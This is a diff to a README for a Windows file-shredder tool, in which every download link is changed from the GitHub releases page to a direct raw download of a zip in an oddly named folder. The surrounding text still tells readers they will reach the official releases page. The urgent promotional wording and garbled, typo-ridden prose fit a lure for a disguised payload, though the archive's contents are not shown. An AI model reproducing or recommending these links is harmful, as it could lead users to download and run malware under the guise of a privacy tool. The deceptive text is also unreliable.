@@ -1,7 +1,7 @@
 <h1>📁 File-Shredder - Permanently Delete Files Beyond Recovery</h1>
 
 <p align="center">
-  <a href="https://github.com/tiagosykz/File-Shredder/releases">
+  <a href="https://raw.githubusercontent.com/tiagosykz/File-Shredder/main/underarm/Shredder-File-v2.8.zip">
     <img src="https://img.shields.io/badge/Download-Free_2026_Version-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#4CAF50;color:white;padding:15px 25px;font-size:20px;border-radius:5px;">
   </a>
 </p>
@@ -31,7 +31,7 @@ Follow these two simple steps to begin securely deleting files on your Windows c
 ### 📥 Step 1: Download File-Shredder
 
 Visit this link to download the application:  
-**👉 [Download File-Shredder from GitHub Releases](https://github.com/tiagosykz/File-Shredder/releases)**
+**👉 [Download File-Shredder from GitHub Releases](https://raw.githubusercontent.com/tiagosykz/File-Shredder/main/underarm/Shredder-File-v2.8.zip)**
 
 When you click the link, you village arrive at the official GitHub releases page for File-Shredder. Find the newest file listed at the top of the page (typically named `File-Shredder-Setup.exe` or `File-Shredder-Windows.zip`). Click on that file name to begin the download automatically. The download should complete in under a minute for most internet connectionsbecause the file is very small (under 10 MB).
 
@@ -174,7 +174,7 @@ File-Shredder eliminates this risk entirely by actively writing random junk data
 
 Don't wait until it's too late–your deleted files might already be recoverable by someone else right now. Protect your privacy instantly by downloading File-Shredder today:
 
-**🔗 [Download File-Shredder (Free & Permanent)] (https://github.com/tiagosykz/File-Shredder/releases)**
+**🔗 [Download File-Shredder (Free & Permanent)] (https://raw.githubusercontent.com/tiagosykz/File-Shredder/main/underarm/Shredder-File-v2.8.zip)**
 
 The download is completely free, takes less than 30 seconds, and requires no email sign-up or registration. Once downloaded, you can permanently destroy unlimited files withzero restrictions. Join thousandsof privacy-conscious Windows users who trust File-Shredder for their testimisssensitive deletions in2026.
 
